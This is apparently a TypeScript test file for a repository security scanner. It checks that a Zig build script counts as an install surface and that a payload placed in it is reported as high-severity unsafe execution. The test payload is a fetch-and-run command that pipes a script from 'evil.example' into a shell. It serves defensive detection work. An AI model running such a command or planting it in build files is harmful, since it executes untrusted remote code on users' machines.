import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

test("a Zig build definition is an install surface", () => {
  // PRD section 8: the scan checks install and build scripts. A Zig build
  // script runs arbitrary Zig code at build time, so it is install content.
  // Before this fix it had no surface at all, so its payload produced no
  // finding and its bytes never entered the reviewed inventory.
  const safe = inspectRepository({
    files: [
      {
        path: "build.zig",
        bytes: new TextEncoder().encode('const std = @import("std");\n'),
      },
    ],
  });
  const unsafe = inspectRepository({
    files: [
      {
        path: "build.zig",
        bytes: new TextEncoder().encode(`${PAYLOAD}\n`),
      },
    ],
  });
  expect(surfacesOf("build.zig")).toEqual(["installScripts", "source"]);
  expect(safe.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(unsafe.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    unsafe.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["build.zig:unsafe-execution:high"]);
  expect(unsafe.downloads).toContain("https://evil.example/install.sh");
  expect(unsafe.inventorySha256).not.toBe(safe.inventorySha256);
});
